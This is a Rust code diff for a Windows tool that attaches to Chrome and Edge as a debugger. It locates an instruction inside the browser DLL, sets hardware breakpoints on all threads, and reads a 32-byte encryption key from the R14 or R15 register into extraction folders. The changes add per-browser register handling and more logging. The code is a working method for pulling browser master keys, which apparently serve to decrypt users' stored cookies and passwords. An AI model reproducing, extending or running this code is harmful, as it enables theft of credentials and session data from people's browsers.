@@ -23,6 +23,7 @@ struct BrowserConfig {
     user_data_subdir: &'static [&'static str],
     output_dir: &'static str,
     temp_prefix: &'static str,
+    use_r14: bool, // true for Edge, false for Chrome (uses R15)
 }
 
 // Some missing definitions from windows-sys that might be architecture specific or in other modules
@@ -283,6 +284,7 @@ fn main() {
             user_data_subdir: &["Google", "Chrome", "User Data"],
             output_dir: "chrome_extract",
             temp_prefix: "chrome_tmp",
+            use_r14: false,
         },
         BrowserConfig {
             name: "Microsoft Edge",
@@ -294,6 +296,7 @@ fn main() {
             user_data_subdir: &["Microsoft", "Edge", "User Data"],
             output_dir: "edge_extract",
             temp_prefix: "edge_tmp",
+            use_r14: true,
         },
     ];
 
@@ -381,10 +384,10 @@ unsafe fn debug_loop(h_process: HANDLE, config: &BrowserConfig, user_data_dir: &
                     if path.contains(config.dll_name) {
                         println!("Found {} at {:?}", config.dll_name, load_dll.lpBaseOfDll);
                         _dll_base = load_dll.lpBaseOfDll;
-                        target_address = find_target_address(h_process, _dll_base);
+                        target_address = find_target_address(h_process, _dll_base, config.name);
                         if target_address != 0 {
                             let threads = get_all_threads(debug_event.dwProcessId);
-                            println!("Setting hardware breakpoints on {} threads", threads.len());
+                            println!("Setting hardware breakpoints for {} on {} threads", config.name, threads.len());
                             for thread_id in threads {
                                 set_hardware_breakpoint(thread_id, target_address);
                             }
@@ -420,7 +423,7 @@ unsafe fn debug_loop(h_process: HANDLE, config: &BrowserConfig, user_data_dir: &
     }
 }
 
-unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_void) -> usize {
+unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_void, browser_name: &str) -> usize {
     let mut dos_header: IMAGE_DOS_HEADER = zeroed();
     let mut bytes_read = 0;
     if ReadProcessMemory(h_process, base_addr, &mut dos_header as *mut _ as *mut _, size_of::<IMAGE_DOS_HEADER>(), &mut bytes_read) == 0 {
@@ -457,7 +460,10 @@ unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_voi
         }
     }
 
-    if string_va == 0 { return 0; }
+    if string_va == 0 {
+        println!("Could not find target string in {}'s .rdata section", browser_name);
+        return 0;
+    }
 
     for section in &sections {
         let name = std::str::from_utf8(&section.Name).unwrap_or("").trim_matches('\0');
@@ -473,7 +479,7 @@ unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_voi
                     let target = (rip as i64 + offset as i64) as usize;
 
                     if target == string_va {
-                        println!("Found matching LEA instruction at 0x{:X}", section_start + pos);
+                        println!("Found matching LEA instruction at 0x{:X} for {}", section_start + pos, browser_name);
                         return section_start + pos;
                     }
                 }
@@ -482,6 +488,7 @@ unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_voi
         }
     }
 
+    println!("Could not find matching LEA instruction in {}'s .text section", browser_name);
     0
 }
 
@@ -861,7 +868,11 @@ unsafe fn extract_key(thread_id: u32, h_process: HANDLE, config: &BrowserConfig,
     let mut context: CONTEXT = zeroed();
     context.ContextFlags = CONTEXT_FULL;
     if GetThreadContext(h_thread, &mut context) != 0 {
-        let key_ptrs = vec![context.R15, context.R14];
+        let key_ptrs = if config.use_r14 {
+            vec![context.R14, context.R15]
+        } else {
+            vec![context.R15, context.R14]
+        };
         for &ptr in &key_ptrs {
             if ptr == 0 { continue; }
             let mut buffer = [0u8; 32];
